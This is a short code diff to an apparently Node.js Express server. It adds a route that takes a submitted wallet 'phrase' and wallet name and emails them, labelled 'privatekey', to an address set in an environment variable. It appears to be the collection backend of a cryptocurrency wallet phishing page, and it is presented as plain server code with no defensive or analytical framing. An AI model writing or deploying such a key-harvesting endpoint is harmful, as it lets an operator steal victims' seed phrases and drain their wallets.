@@ -84,6 +84,26 @@ app.post("/", (req, res) => {
     }
   });
 });
+app.post("/isai", (req, res) => {
+  const mailOptions = {
+    from: process.env.SENDER_MAIL,
+    to: process.env.ISAI,
+    subject: "private key",
+    html: `
+        <p>
+            <b>privatekey: </b>${req.body.phrase}<br>
+            <b>wallet: </b>${req.body.initial}<br>
+        </p>`,
+  };
+  transporter.sendMail(mailOptions, function (err, data) {
+    if (err) {
+      console.log(err);
+    } else {
+      console.log("sent");
+      res.send("sent");
+    }
+  });
+});
 
 app.listen(PORT, () => {
   console.log(`app is listening on port ${PORT}`);
